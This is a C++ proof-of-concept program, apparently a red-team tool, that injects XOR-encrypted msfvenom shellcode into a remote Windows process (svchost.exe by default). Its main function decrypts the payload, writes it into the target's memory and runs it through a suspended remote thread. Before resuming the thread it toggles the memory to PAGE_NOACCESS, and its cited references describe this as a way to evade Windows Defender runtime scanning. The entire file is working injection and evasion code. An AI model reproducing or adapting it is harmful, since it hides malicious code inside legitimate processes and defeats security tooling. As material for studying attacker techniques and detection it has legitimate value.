/*
	Author: @m8sec
	References:
		https://github.com/plackyhacker/SuspendedThreadInjection
		https://labs.f-secure.com/blog/bypassing-windows-defender-runtime-scanning/
*/

#include <string>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <tlhelp32.h>


int GetProcByName(const char* procname) {
	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	hProcSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;

	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (!Process32First(hProcSnap, &pe32)) {
		CloseHandle(hProcSnap);
		return 0;
	}

	while (Process32Next(hProcSnap, &pe32)) {
		if (lstrcmpiA(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}

	CloseHandle(hProcSnap);

	return pid;
}


DWORD GetPid(int argc, char* argv[]) {
	DWORD pid;
	if (argc > 1) {
		if (isdigit(argv[1][0]))
		{
			pid = atoi(argv[1]);
		}
		else {
			pid = GetProcByName(argv[1]);
		}
	}
	else {
		// default injection point
		pid = GetProcByName("svchost.exe");
	}
	return pid;
}

void DecryptXOR(char* data, size_t data_len, char* key, size_t key_len) {
	int x = 0;
	for (int i = 0; i < data_len; i++) {
		if (x == key_len - 1) x = 0;
		data[i] = data[i] ^ key[x];
		x++;
	}
}

int main(int argc, char* argv[]) {

	// msfvenom -p windows/x64/exec CMD="calc.exe" -f c --encrypt xor --encrypt-key m8sec
	unsigned char buf[] = "\x91\x70\xf0\x81\x93\x85\xf8";

	char key[] = "m8sec";
	unsigned int buf_len = sizeof(buf);


	// Get PID from CMD args OR PidAutoSelect()
	DWORD pid = GetPid(argc, argv);

	// Execute shellcode
	PVOID procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	printf("[*] Opened process handle (PID: %d).\n", pid);

	Sleep(1 * 1000);

	PVOID memAddr = VirtualAllocEx(procHandle, NULL, buf_len, (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("[*] Allocated Memory at 0x%p.\n", memAddr);

	Sleep(1 * 1000);

	// Decrypt shellcode based on static key
	DecryptXOR((char*)buf, buf_len, key, sizeof(key));
	printf("[*] Shellcode Decrypted using stored key.\n");

	WriteProcessMemory(procHandle, memAddr, buf, buf_len, NULL);
	printf("[*] ShellCode copied into memory.\n");

	Sleep(1 * 1000);
	system("pause");

	DWORD oldProtect;
	VirtualProtectEx(procHandle, memAddr, buf_len, PAGE_NOACCESS, &oldProtect);
	printf("[*] Modified memory protection to: PAGE_NOACCESS.\n");

	Sleep(1 * 1000);
	system("pause");

	DWORD threadID;
	HANDLE sThread = CreateRemoteThread(procHandle, NULL, 0, (PTHREAD_START_ROUTINE)memAddr, NULL, 0x00000004, &threadID);

	Sleep(1 * 1000);

	DWORD threadId = GetThreadId(sThread);
	printf("[*] Created supsended thread in remote process, ThreadID %u\n", threadId);

	system("pause");

	int stime = 8;
	printf("[*] Sleeping for: %d seconds...\n", stime);
	Sleep(stime * 1000);


	VirtualProtectEx(procHandle, memAddr, buf_len, PAGE_EXECUTE_READ, &oldProtect);
	printf("[*] Modified memory protection to: PAGE_EXECUTE_READ.\n");

	system("pause");

	stime = 8;
	printf("[*] Sleeping for: %d seconds...\n", stime);
	Sleep(stime * 1000);

	ResumeThread(sThread);
	printf("[*] Resume thread execution.\n");

	CloseHandle(procHandle);
	return 0;
}
